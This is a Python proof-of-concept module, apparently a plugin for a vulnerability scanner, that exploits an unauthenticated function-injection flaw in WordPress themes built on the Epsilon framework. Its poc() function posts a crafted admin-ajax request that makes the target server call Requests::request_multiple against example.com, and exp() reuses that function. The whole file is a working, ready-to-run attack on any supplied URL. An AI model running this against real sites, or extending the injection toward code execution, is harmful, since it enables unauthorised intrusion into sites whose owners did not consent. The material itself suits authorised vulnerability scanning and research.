import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''WordPress Multiple Themes - Unauthenticated Function Injection''',
        "description": '''''',
        "severity": "high",
        "references": [
            "https://www.exploit-db.com/exploits/49327", 
            "https://wpscan.com/vulnerability/10417"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["wordpress", "rce", "ssrf"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/wp-admin/admin-ajax.php?action=action_name"""
        method = "POST"
        data = """action=epsilon_framework_ajax_action&args%5Baction%5D%5B%5D=Requests&args%5Baction%5D%5B%5D=request_multiple&args%5Bargs%5D%5B0%5D%5Burl%5D=http://example.com"""
        headers = {'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if ("""Example Domain""" in resp0.text and """protocol_version""" in resp0.text) and (resp0.status_code == 200):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url